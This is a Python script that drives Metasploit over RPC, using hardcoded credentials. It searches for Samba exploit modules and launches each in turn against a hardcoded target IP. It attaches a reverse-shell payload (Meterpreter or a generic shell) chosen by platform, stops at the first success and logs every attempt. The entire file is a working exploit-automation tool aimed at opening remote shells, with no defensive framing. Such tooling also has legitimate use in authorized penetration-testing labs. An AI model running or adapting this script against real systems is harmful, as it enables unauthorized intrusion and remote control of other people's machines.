
from pymetasploit3.msfrpc import MsfRpcClient
from datetime import datetime
import os

LOG_FILE = 'exploit_log.txt'


def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] {message}\n")
    print(message)


def connect_to_metasploit(password='password123', username='msf', port=55553):
    try:
        client = MsfRpcClient(password, username=username, port=port, ssl=False)
        log("[+] Connected to Metasploit RPC")
        return client
    except Exception as e:
        log(f"[!] Failed to connect to Metasploit: {e}")
        exit(1)


def search_exploits(client, keyword):
    log(f"[+] Searching for exploits with keyword: {keyword}")
    modules = client.modules.search(keyword)
    exploits = [m for m in modules if m['type'] == 'exploit']
    log(f"[+] Found {len(exploits)} modules for '{keyword}':")
    for mod in exploits:
        log(f"    - {mod['fullname']}")
    return exploits


def select_payload(exploit_name):
    if 'windows' in exploit_name.lower():
        return 'windows/meterpreter/reverse_tcp'
    elif 'linux' in exploit_name.lower():
        return 'linux/x86/meterpreter/reverse_tcp'
    elif 'osx' in exploit_name.lower():
        return 'osx/x86/shell_reverse_tcp'
    elif 'unix' in exploit_name.lower():
        return 'cmd/unix/reverse'
    else:
        return 'generic/shell_reverse_tcp'


def try_exploit(client, exploit_name, payload_name, target_ip):
    try:
        log(f"[*] Trying exploit: {exploit_name}")
        exploit = client.modules.use('exploit', exploit_name)
        payload = client.modules.use('payload', payload_name)

        exploit['RHOSTS'] = target_ip
        payload['LHOST'] = '0.0.0.0'
        payload['LPORT'] = 4444

        exploit.execute(payload=payload_name)
        log(f"[+] Executed {exploit_name} with {payload_name}")
        return True

    except Exception as e:
        log(f"    [!] Error: {e}")
        return False


def main():
    target_ip = '192.168.100.73'  # Replace with dynamic input later
    search_term = 'samba'

    client = connect_to_metasploit()
    exploit_modules = search_exploits(client, search_term)

    success = False
    for mod in exploit_modules:
        exploit_name = mod['fullname']
        payload_name = select_payload(exploit_name)
        if try_exploit(client, exploit_name, payload_name, target_ip):
            log(f"[âœ“] SUCCESSFUL exploit: {exploit_name} -> {target_ip}")
            success = True
            break

    if not success:
        log("[-] All exploits attempted. No session was created.")


if __name__ == '__main__':
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    main()

